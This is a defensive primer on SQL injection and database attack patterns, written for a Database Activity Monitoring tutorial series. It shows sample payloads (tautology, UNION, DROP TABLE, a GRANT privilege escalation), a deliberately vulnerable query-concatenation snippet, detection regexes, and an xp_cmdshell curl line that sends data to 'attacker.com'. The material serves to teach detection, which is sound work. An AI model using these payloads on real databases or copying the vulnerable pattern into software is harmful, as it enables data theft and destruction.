# Primer 2: SQL Injection & Database Attack Patterns

Welcome to the second primer in our Database Activity Management series! While the first primer covered **what** DAM is and **why** it matters, this primer focuses on **what you're protecting against**—the specific attack patterns and threat vectors that DAM detects and prevents.

Understanding these attacks is essential because you can't defend against what you don't understand. This primer provides a comprehensive overview of database attack patterns, how they work, and how DAM detects them.

---

## P.1: Understanding SQL Injection

### What is SQL Injection?

**SQL Injection (SQLi)** is a code injection technique where an attacker inserts malicious SQL statements into an application's input fields. These statements are then sent to the database, where they can read, modify, or delete data.

**The Core Problem**: When an application constructs SQL queries by directly concatenating user input, the attacker can "break out" of the intended query and execute arbitrary SQL.

### The Classic Example

**Vulnerable Code:**
```python
# DON'T DO THIS - THIS IS VULNERABLE!
user_input = request.get('username')
query = f"SELECT * FROM users WHERE username = '{user_input}'"
cursor.execute(query)
```

**Normal Request:**
```
username = "alice"
Query: SELECT * FROM users WHERE username = 'alice'
Result: Returns Alice's user record
```

**Malicious Request:**
```
username = "alice' OR 1=1 --"
Query: SELECT * FROM users WHERE username = 'alice' OR 1=1 --'
Result: Returns ALL user records (because 1=1 is always true)
```

### The Anatomy of the Attack

```
┌─────────────────────────────────────────────────────────────────────┐
│                    SQL INJECTION ATTACK FLOW                        │
│                                                                     │
│  ┌─────────────┐                                                   │
│  │  Attacker   │                                                   │
│  └─────────────┘                                                   │
│        │                                                           │
│        ▼                                                           │
│  ┌─────────────────────────────────────────────────────────────┐   │
│  │  1. Attacker crafts malicious input                        │   │
│  │     "alice' OR 1=1 --"                                     │   │
│  └─────────────────────────────────────────────────────────────┘   │
│        │                                                           │
│        ▼                                                           │
│  ┌─────────────────────────────────────────────────────────────┐   │
│  │  2. Application concatenates input into SQL                 │   │
│  │     "SELECT * FROM users WHERE username = '"               │   │
│  │     + "alice' OR 1=1 --"                                   │   │
│  │     + "'"                                                   │   │
│  └─────────────────────────────────────────────────────────────┘   │
│        │                                                           │
│        ▼                                                           │
│  ┌─────────────────────────────────────────────────────────────┐   │
│  │  3. Resulting query sent to database                       │   │
│  │     SELECT * FROM users WHERE username = 'alice' OR 1=1 --'│   │
│  └─────────────────────────────────────────────────────────────┘   │
│        │                                                           │
│        ▼                                                           │
│  ┌─────────────────────────────────────────────────────────────┐   │
│  │  4. Database executes query                                 │   │
│  │     - 'alice' (matches some users)                         │   │
│  │     - OR 1=1 (matches ALL users)                           │   │
│  │     - -- (comments out the rest of the query)              │   │
│  └─────────────────────────────────────────────────────────────┘   │
│        │                                                           │
│        ▼                                                           │
│  ┌─────────────────────────────────────────────────────────────┐   │
│  │  5. Attacker receives ALL user records                     │   │
│  └─────────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────────┘
```

---

## P.2: SQL Injection Attack Types

### Type 1: Tautology (Always True)

**What it is**: The attacker injects a condition that is always true, bypassing authentication or returning all records.

**Pattern**: `OR 1=1`, `OR '1'='1'`, `OR true`

**Example**: 
```
Login: ' OR 1=1 --
Password: anything
Query: SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = 'anything'
Effect: Returns ALL users, bypassing authentication
```

**How DAM detects it**: The pattern `OR 1=1` matches the tautology rule.

**Real-World Analogy**: A security guard who checks IDs normally, but if you say "I'm the owner" (always true for the owner), they let you in without checking.

### Type 2: Union Query Injection

**What it is**: The attacker uses `UNION` to combine the original query with another query, extracting data from different tables.

**Pattern**: `UNION SELECT`

**Example**:
```
Input: 1 UNION SELECT username, password FROM admin
Query: SELECT id, name FROM users WHERE id = 1 UNION SELECT username, password FROM admin
Effect: Returns admin usernames and passwords alongside regular user data
```

**How DAM detects it**: The pattern `UNION SELECT` matches the union injection rule.

**Real-World Analogy**: A spy who combines a legitimate delivery with a hidden payload—the delivery arrives normally, but the hidden payload extracts secrets.

### Type 3: Stacked Query Injection

**What it is**: The attacker uses a semicolon to terminate the original query and execute additional malicious queries.

**Pattern**: `; DROP TABLE`, `; UPDATE`, `; DELETE`

**Example**:
```
Input: 1; DROP TABLE users
Query: SELECT * FROM users WHERE id = 1; DROP TABLE users
Effect: The original SELECT executes, then the DROP TABLE deletes the users table
```

**How DAM detects it**: The pattern `; DROP` matches the stacked query rule.

**Real-World Analogy**: A delivery person who rings the doorbell (legitimate action) and then kicks the door down (malicious action) in the same visit.

### Type 4: Comment Injection

**What it is**: The attacker injects SQL comments to "comment out" the rest of the query, neutralizing security checks.

**Pattern**: `--` (single-line comment), `/* */` (multi-line comment)

**Example**:
```
Input: admin' --
Query: SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'
Effect: The password check is commented out, allowing authentication with just the username
```

**How DAM detects it**: The pattern `--` matches the comment injection rule.

**Real-World Analogy**: A spy who cuts the security camera wires (comments out the security) before breaking in.

### Type 5: Time-Based Blind Injection

**What it is**: The attacker uses database functions that introduce delays, inferring information from response times.

**Pattern**: `SLEEP()`, `WAITFOR DELAY`, `BENCHMARK()`

**Example**:
```
Input: 1 OR SLEEP(5)
Query: SELECT * FROM users WHERE id = 1 OR SLEEP(5)
Effect: The database pauses for 5 seconds. The attacker infers something about the database from the delay.
```

**How DAM detects it**: The heuristic analysis flags `SLEEP`, `BENCHMARK`, and similar functions.

**Real-World Analogy**: A burglar who taps on a window (sends a test) and listens for how long it takes to hear a response, learning about the house layout without seeing anything.

### Type 6: Error-Based Injection

**What it is**: The attacker crafts queries that generate database errors, revealing information about the database structure.

**Pattern**: `CONVERT()`, `CAST()`, division by zero

**Example**:
```
Input: 1 AND CONVERT(int, @@version)
Query: SELECT * FROM users WHERE id = 1 AND CONVERT(int, @@version)
Effect: The database throws an error revealing the version and structure
```

**How DAM detects it**: The heuristic analysis flags `CONVERT`, `CAST`, and suspicious type conversions.

**Real-World Analogy**: A spy who "accidentally" trips a silent alarm, learning about the security system's layout from how it responds.

---

## P.3: Dangerous DDL Operations

### What is DDL?

**DDL (Data Definition Language)** includes SQL commands that define or modify the database structure:

| Command | Purpose | Danger Level |
|---------|---------|--------------|
| `CREATE` | Create new tables, databases, or indexes | Medium |
| `ALTER` | Modify existing tables | High |
| `DROP` | Delete tables or databases | Critical |
| `TRUNCATE` | Remove all rows from a table | Critical |
| `RENAME` | Rename tables or columns | Medium |
| `GRANT` | Give permissions to users | Critical |
| `REVOKE` | Remove permissions from users | High |

### The Danger of DDL Operations

**Why DDL operations are dangerous:**

1. **Irreversible**: `DROP TABLE` is immediate and permanent
2. **Wide Impact**: One DDL operation can affect thousands of rows
3. **No Business Logic**: DDL bypasses application business rules
4. **Privilege Escalation**: `GRANT` can give attackers more access

### Example: The DROP TABLE Attack

```
Original Query: SELECT * FROM products WHERE id = 1
Malicious Input: 1; DROP TABLE products
Resulting Query: SELECT * FROM products WHERE id = 1; DROP TABLE products
Effect: The products table is deleted permanently
```

**How DAM detects it**: The pattern `DROP TABLE` matches the DDL rules.

**Real-World Analogy**: An employee with a key to the building who also has access to the building's demolition controls. They can tear down the entire building with a single action.

---

## P.4: Privilege Escalation

### What is Privilege Escalation?

**Privilege escalation** occurs when an attacker gains higher permissions than they should have. In database terms, this means executing commands that should only be available to administrators.

### Types of Privilege Escalation

#### Horizontal Escalation
- Accessing data belonging to other users
- Example: A user viewing another user's profile

#### Vertical Escalation
- Gaining administrative privileges
- Example: A regular user executing DROP commands

### Example: GRANT Attack

```
Attacker Input: 1; GRANT ALL PRIVILEGES ON *.* TO 'attacker'@'%'
Query: SELECT * FROM users WHERE id = 1; GRANT ALL PRIVILEGES ON *.* TO 'attacker'@'%'
Effect: The attacker creates a new database user with full administrative privileges
```

**How DAM detects it**: The pattern `GRANT` matches the privilege escalation rule.

**Real-World Analogy**: A temp worker who gets access to a janitor's keycard, duplicates it, and uses it to access the executive floor.

---

## P.5: Data Exfiltration

### What is Data Exfiltration?

**Data exfiltration** is the unauthorized transfer of data from your database. It's often slow and subtle, making it difficult to detect.

### How Attackers Exfiltrate Data

| Method | Technique | Detection Difficulty |
|--------|-----------|---------------------|
| **Large SELECTs** | Querying entire tables | Medium |
| **Incremental** | Small chunks over time | High |
| **Via Applications** | Through legitimate app features | Very High |
| **Backup Theft** | Stealing database backups | Low (if monitored) |
| **Export Functions** | Using database export utilities | Medium |

### Example: The Slow Extract

**What happens**: An attacker runs a series of SELECT statements, each retrieving a small portion of data. Over days or weeks, they extract the entire database.

```
Day 1: SELECT * FROM customers LIMIT 1000
Day 2: SELECT * FROM customers LIMIT 1000 OFFSET 1000
Day 3: SELECT * FROM customers LIMIT 1000 OFFSET 2000
...
```

**How DAM detects it**: Frequency analysis identifies the high volume of queries. Pattern analysis detects the repeated pattern.

**Real-World Analogy**: A spy who takes one photo of a classified document every day. No single day is suspicious, but over time, they've stolen everything.

---

## P.6: Advanced Attack Techniques

### 1. Second-Order Injection

**What it is**: The malicious input is stored in the database (e.g., as a username) and executed later when the data is used in a query.

**Example**:
```
Step 1: Attacker creates username "admin' --"
Step 2: Application stores the username in the database
Step 3: Later, the application retrieves and uses the username in a query
Step 4: Query: SELECT * FROM logs WHERE username = 'admin' --'
Step 5: The comment is executed, bypassing the rest of the query
```

**Why it's dangerous**: Traditional input validation might catch the first injection, but the second-order injection happens later, when the data is already in the database.

**How DAM detects it**: DAM doesn't prevent storage, but it **detects the execution** when the query runs.

### 2. Out-of-Band Injection

**What it is**: The attacker uses database features to send data outside the normal response channel.

**Example**:
```
Input: 1 OR (SELECT data FROM secrets) IS NOT NULL; 
       EXEC xp_cmdshell 'curl http://attacker.com/?data=' || data
Effect: The data is sent to the attacker's server via HTTP
```

**Why it's dangerous**: The attacker doesn't need to see the query results directly—data is sent through a separate channel.

**How DAM detects it**: Heuristic analysis identifies `xp_cmdshell`, `curl`, `wget`, and other external commands.

### 3. Polymorphic Injection

**What it is**: The attacker uses encoding and obfuscation techniques to bypass pattern matching.

**Example**:
```sql
-- Normal: SELECT * FROM users WHERE id = 1 OR 1=1
-- Encoded: SELECT * FROM users WHERE id = 1 OR (1)=(1)
-- Hex: SELECT * FROM users WHERE id = 1 OR 0x31=0x31
-- URL Encoded: SELECT * FROM users WHERE id = 1 OR 1%3D1
```

**Why it's dangerous**: Simple pattern matching can miss these encoded forms.

**How DAM detects it**: Normalization decodes and normalizes the query before pattern matching.

**Real-World Analogy**: A spy who uses invisible ink, microdots, and coded messages—the message is there, but you need to process it to see the threat.

---

## P.7: How DAM Detects Attacks

### The Detection Arsenal

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                     DETECTION METHODS                                       │
│                                                                             │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │ 1. Signature Matching                                               │   │
│  │    - Looks for known attack patterns (OR 1=1, UNION SELECT, etc.) │   │
│  │    - Fast, reliable, low false positives                           │   │
│  │    - Can't detect new, unknown attacks                             │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
│                                                                             │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │ 2. Heuristic Analysis                                              │   │
│  │    - Looks for suspicious behavior, not just known patterns        │   │
│  │    - Flags sensitive table access, unusual commands                │   │
│  │    - Can detect new attacks, but may have false positives          │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
│                                                                             │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │ 3. Frequency Analysis                                              │   │
│  │    - Tracks query volume per user                                  │   │
│  │    - Flags unusual spikes (potential brute force)                  │   │
│  │    - Identifies slow data exfiltration                             │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
│                                                                             │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │ 4. Anomaly Detection                                               │   │
│  │    - Establishes normal behavior baselines                         │   │
│  │    - Flags deviations from the baseline                            │   │
│  │    - Detects insider threats                                       │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Detection Examples

| Attack | Detection Method | Rule/Pattern |
|--------|------------------|--------------|
| `OR 1=1` | Signature | `OR\s+['"]?1['"]?\s*=\s*['"]?1` |
| `UNION SELECT` | Signature | `UNION\s+SELECT` |
| `; DROP TABLE` | Signature | `;\s*DROP\s+TABLE` |
| `--` | Signature | `--` |
| `SLEEP(5)` | Heuristic | `SLEEP|DELAY|WAITFOR` |
| Accessing "passwords" | Heuristic | Sensitive table list |
| >100 queries/minute | Frequency | History threshold |
| Unusual time of day | Anomaly | Baseline comparison |

---

## P.8: The Attack Lifecycle (How DAM Responds)

### Step-by-Step: Attack → Response

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    ATTACK LIFECYCLE IN DAM                                  │
│                                                                             │
│  Phase 1: ATTACK INITIATION                                                │
│  ┌───────────────────────────────────────────────────────────────────┐     │
│  │ Attacker sends malicious input → Application → Database Query     │     │
│  └───────────────────────────────────────────────────────────────────┘     │
│                              ▼                                             │
│  Phase 2: INTERCEPTION                                                     │
│  ┌───────────────────────────────────────────────────────────────────┐     │
│  │ DAM intercepts the query at application, driver, and/or native    │     │
│  │ layers                                                             │     │
│  └───────────────────────────────────────────────────────────────────┘     │
│                              ▼                                             │
│  Phase 3: NORMALIZATION                                                    │
│  ┌───────────────────────────────────────────────────────────────────┐     │
│  │ Query normalized to reveal structural pattern                    │     │
│  │ "SELECT * FROM users WHERE email = '?' OR ? = ? --'"            │     │
│  └───────────────────────────────────────────────────────────────────┘     │
│                              ▼                                             │
│  Phase 4: DETECTION                                                        │
│  ┌───────────────────────────────────────────────────────────────────┐     │
│  │ Pattern matching: OR 1=1 → Rule: sqli_tautology → Score: 10      │     │
│  │ Pattern matching: -- → Rule: sqli_comment → Score: 10            │     │
│  │ Heuristic: Sensitive table "users" → Score: 5                    │     │
│  │ Total Score: 25 → Level: CRITICAL                                │     │
│  └───────────────────────────────────────────────────────────────────┘     │
│                              ▼                                             │
│  Phase 5: RESPONSE DETERMINATION                                           │
│  ┌───────────────────────────────────────────────────────────────────┐     │
│  │ Score: 25 → Determine Action: BLOCK                              │     │
│  │ Reasons: CRITICAL severity, BLOCK rule matched                   │     │
│  └───────────────────────────────────────────────────────────────────┘     │
│                              ▼                                             │
│  Phase 6: EXECUTE RESPONSE                                                │
│  ┌───────────────────────────────────────────────────────────────────┐     │
│  │ Actions:                                                         │     │
│  │ 1. Query blocked immediately                                     │     │
│  │ 2. User connection terminated                                    │     │
│  │ 3. Incident logged to vault                                      │     │
│  │ 4. Security team notified                                        │     │
│  │ 5. Circuit breaker activated (repeated attacks)                 │     │
│  └───────────────────────────────────────────────────────────────────┘     │
│                              ▼                                             │
│  Phase 7: RECORDING                                                       │
│  ┌───────────────────────────────────────────────────────────────────┐     │
│  │ Audit Table: Records the blocked query, threat level, action     │     │
│  │ Incident Vault: Records immutable incident details for forensics │     │
│  └───────────────────────────────────────────────────────────────────┘     │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## P.9: Real-World Attack Statistics

### The Scale of the Problem

| Statistic | Value | Source |
|-----------|-------|--------|
| SQL Injection attacks per day | Over 100,000 | Imperva |
| Data breaches caused by SQLi | ~40% of all breaches | Verizon DBIR |
| Average cost of a data breach | $4.35 million | IBM Cost of Data Breach |
| Time to detect a breach | ~277 days on average | IBM Cost of Data Breach |
| SQLi attacks blocked by WAF | 72% | Cloudflare |
| Insider threats | 34% of all breaches | Verizon DBIR |

### Why These Numbers Matter

1. **SQL injection is the #1 web attack vector** - If you have a database exposed to the web, you WILL be targeted.

2. **Insider threats are common** - You need to trust, but verify. Logs and monitoring are essential.

3. **Detection takes too long** - The longer a breach goes undetected, the more damage is done.

4. **Costs are staggering** - A single breach can bankrupt a company.

5. **WAFs alone aren't enough** - They protect the application layer, not the database layer.

**DAM fills the gap that these statistics highlight.**

---

## P.10: Prevention vs. Detection vs. Response

### The Security Pyramid

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                     SECURITY CAPABILITIES                                   │
│                                                                             │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │                                                                     │   │
│  │                          PREVENTION                                 │   │
│  │          (Stop attacks before they happen)                         │   │
│  │      Secure coding, parameterized queries, WAF                     │   │
│  │                                                                     │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
│                              ▼                                             │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │                                                                     │   │
│  │                          DETECTION                                  │   │
│  │          (Identify attacks when they happen)                       │   │
│  │      Monitoring, logging, pattern matching, heuristics             │   │
│  │                                                                     │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
│                              ▼                                             │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │                                                                     │   │
│  │                          RESPONSE                                   │   │
│  │          (Take action when attacks are detected)                   │   │
│  │      Blocking, notifications, circuit breakers, vaults             │   │
│  │                                                                     │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────────────────┘
```

### The DAM Contribution

| Capability | DAM's Role | Traditional Tools |
|------------|------------|-------------------|
| **Prevention** | Blocks dangerous queries | WAF, secure coding |
| **Detection** | Identifies attacks in real-time | SIEM, logs |
| **Response** | Automated action | Manual investigation |
| **Forensics** | Immutable evidence | Security teams |
| **Audit** | Complete activity log | Limited app logs |

**DAM provides prevention (by blocking), detection (by monitoring), and response (by acting) ALL IN ONE SYSTEM.**

---

## P.11: Common Myths and Misconceptions

### Myth 1: "We use parameterized queries, so we're safe from SQL injection"

**Reality**: Parameterized queries are excellent for preventing injection through application code, but they don't protect against:
- Direct database access (tools like psql)
- Stored procedures with dynamic SQL
- Second-order injections
- Administrative access

**DAM provides protection regardless of how the query was generated.**

### Myth 2: "Our WAF protects us from SQL injection"

**Reality**: WAFs protect the application layer. They can be bypassed through:
- Direct database connections
- Encrypted traffic
- Insider threats
- Obfuscated attacks

**DAM protects the database layer itself.**

### Myth 3: "We have a firewall, so we're safe"

**Reality**: Firewalls protect the perimeter. They don't protect against:
- Legitimate users with malicious intent
- Compromised credentials
- SQL injection through the application
- Insider threats

**DAM watches what happens once someone is inside.**

### Myth 4: "DAM will slow down our application"

**Reality**: Properly implemented DAM adds minimal overhead (2-10ms per query). For most applications, this is negligible.

**Our system includes performance optimizations like async logging and batching.**

### Myth 5: "Audit logs are just for compliance"

**Reality**: Audit logs are the foundation of security investigations. They provide:
- Evidence for forensic analysis
- Timeline of security events
- Pattern recognition for detection
- Legal and compliance documentation

**DAM makes logs useful by normalizing and analyzing them.**

---

## P.12: Threat Modeling for Your Database

### How to Think About Threats

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                     THREAT MODELING QUESTIONS                               │
│                                                                             │
│  1. What are we protecting?                                                │
│     ┌─────────────────────────────────────────────────────────────────┐   │
│     │ Customer data (PII), financial data, secrets, business data    │   │
│     └─────────────────────────────────────────────────────────────────┘   │
│                                                                             │
│  2. Who are the threat actors?                                             │
│     ┌─────────────────────────────────────────────────────────────────┐   │
│     │ External attackers, insiders, compromised accounts, partners   │   │
│     └─────────────────────────────────────────────────────────────────┘   │
│                                                                             │
│  3. What are the attack vectors?                                           │
│     ┌─────────────────────────────────────────────────────────────────┐   │
│     │ SQL injection, DDL operations, privilege abuse, exfiltration   │   │
│     └─────────────────────────────────────────────────────────────────┘   │
│                                                                             │
│  4. What is the impact of a breach?                                       │
│     ┌─────────────────────────────────────────────────────────────────┐   │
│     │ Financial loss, reputation damage, legal liability, compliance │   │
│     └─────────────────────────────────────────────────────────────────┘   │
│                                                                             │
│  5. What are our current controls?                                         │
│     ┌─────────────────────────────────────────────────────────────────┐   │
│     │ Firewalls, WAF, authentication, encryption, DAM                │   │
│     └─────────────────────────────────────────────────────────────────┘   │
│                                                                             │
│  6. What are the gaps?                                                    │
│     ┌─────────────────────────────────────────────────────────────────┐   │
│     │ Monitoring, response capabilities, audit coverage              │   │
│     └─────────────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────────────────┘
```

### The Threat Model for Our DAM System

**What we protect:**
- All data in the database (all tables, all operations)

**Who we protect against:**
- External attackers
- Internal threats (employees, contractors)
- Compromised accounts
- Application vulnerabilities

**How we protect:**
- Audit logging (Part 1)
- Multi-layer interception (Part 2)
- Query normalization (Part 3)
- Threat detection (Part 4)
- Incident response (Part 5)

**The gaps we address:**
- Traditional security stops at the perimeter
- Application logs don't show database operations
- No real-time blocking of dangerous queries
- No immutable incident storage

---

## P.13: Summary: What You Need to Know

### Key Attack Types

| Attack | Pattern | DAM Detection |
|--------|---------|---------------|
| Tautology | `OR 1=1` | Signature matching |
| Union | `UNION SELECT` | Signature matching |
| Stacked | `; DROP TABLE` | Signature matching |
| Comments | `--` | Signature matching |
| Time-based | `SLEEP()` | Heuristic analysis |
| Error-based | `CONVERT()` | Heuristic analysis |
| Sensitive access | "passwords" | Heuristic analysis |
| Brute force | High frequency | Frequency analysis |
| Exfiltration | Repeated patterns | Pattern analysis |

### The DAM Protection Model

| Layer | Protection |
|-------|------------|
| **Interception** | Catches queries regardless of source |
| **Normalization** | Reveals the true pattern of queries |
| **Detection** | Identifies known and suspicious patterns |
| **Response** | Blocks, alerts, and records in real-time |
| **Audit** | Provides immutable evidence for investigation |

### Why You Need DAM

1. **SQL injection is the #1 attack vector** - You will be targeted
2. **Insider threats are common** - Trust isn't security
3. **Traditional security stops at the perimeter** - DAM protects the data itself
4. **Compliance requires it** - GDPR, HIPAA, PCI DSS all require audit trails
5. **Detection takes too long** - Real-time detection is essential

### The Bottom Line

**DAM is a critical layer in your security stack that:**

- **Protects** against SQL injection, privilege abuse, and data exfiltration
- **Detects** threats in real-time
- **Responds** automatically
- **Records** everything for forensics
- **Complements** your existing security tools

**You can build it with open source and minimal overhead.**

---

## Next Steps

Now that you understand the attack patterns and how DAM detects them, you're ready to build the system:

**1. Continue to Part 1** - Build the audit logging foundation

**2. Refer back to this primer** - When you encounter attack patterns in your logs

**3. Use the threat model** - When customizing your DAM rules

**4. Share your knowledge** - Help others understand these threats

---

*You now understand the threats that DAM protects against. Next, build the system that detects and prevents these attacks.*
